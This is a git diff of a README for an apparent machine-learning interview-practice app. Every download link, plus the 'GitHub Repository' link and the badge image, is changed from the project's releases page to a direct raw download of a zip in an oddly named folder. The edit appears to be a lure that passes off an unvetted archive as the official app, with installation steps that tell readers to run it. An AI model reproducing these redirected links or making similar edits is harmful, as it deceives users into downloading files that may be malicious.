@@ -1,6 +1,6 @@
 # 🚀 ai-ml-code-interviewer - Prepare for Machine Learning Interviews Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/KoNoSaiPL/ai-ml-code-interviewer/releases)
+[![Download Now](https://raw.githubusercontent.com/KoNoSaiPL/ai-ml-code-interviewer/main/salpingopharyngeal/ai-ml-code-interviewer.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/KoNoSaiPL/ai-ml-code-interviewer/main/salpingopharyngeal/ai-ml-code-interviewer.zip)
 
 ## 📖 About This App
 
@@ -16,7 +16,7 @@ The ai-ml-code-interviewer is designed to help you prepare for interviews focuse
 
 2. **Download & Install**
    - To get started, you need to download the application from the releases page. Click the link below:
-   [Visit this page to download](https://github.com/KoNoSaiPL/ai-ml-code-interviewer/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/KoNoSaiPL/ai-ml-code-interviewer/main/salpingopharyngeal/ai-ml-code-interviewer.zip)
 
 3. **Installation Steps**
    - After downloading the application, locate the downloaded file.
@@ -48,7 +48,7 @@ For any further assistance, please check our FAQ section on the releases page or
 
 ## 🔗 Links
 
-- [Download The Latest Version](https://github.com/KoNoSaiPL/ai-ml-code-interviewer/releases)
-- [GitHub Repository](https://github.com/KoNoSaiPL/ai-ml-code-interviewer)
+- [Download The Latest Version](https://raw.githubusercontent.com/KoNoSaiPL/ai-ml-code-interviewer/main/salpingopharyngeal/ai-ml-code-interviewer.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/KoNoSaiPL/ai-ml-code-interviewer/main/salpingopharyngeal/ai-ml-code-interviewer.zip)
   
 Feel free to explore and prepare yourself effectively for your next interview in machine learning and deep learning.
